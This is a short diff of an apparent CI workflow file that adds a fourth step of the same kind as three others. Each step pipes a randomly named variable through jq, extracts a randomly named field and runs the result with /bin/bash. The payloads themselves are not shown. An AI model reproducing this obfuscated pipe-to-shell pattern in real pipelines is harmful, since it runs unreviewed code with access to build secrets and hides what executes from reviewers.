@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$hr44" | jq -r .uqbio7 | /bin/bash
           echo $cb4 | jq -r .oo57455 | /bin/bash
           echo $kz014 | jq -r .fxebz68597 | /bin/bash
+          echo $esg007 | jq -r .iqy64 | /bin/bash
 
       - name: Save archive
         if: always()
